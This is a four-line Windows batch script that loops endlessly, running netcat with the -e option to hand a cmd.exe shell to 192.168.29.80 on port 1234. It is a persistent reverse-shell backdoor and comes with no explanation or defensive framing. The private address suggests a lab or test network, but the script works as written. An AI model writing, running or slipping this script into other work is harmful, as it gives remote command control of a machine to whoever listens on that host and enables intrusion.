@echo off
:top
nc.exe -e cmd.exe 192.168.29.80 1234
goto top
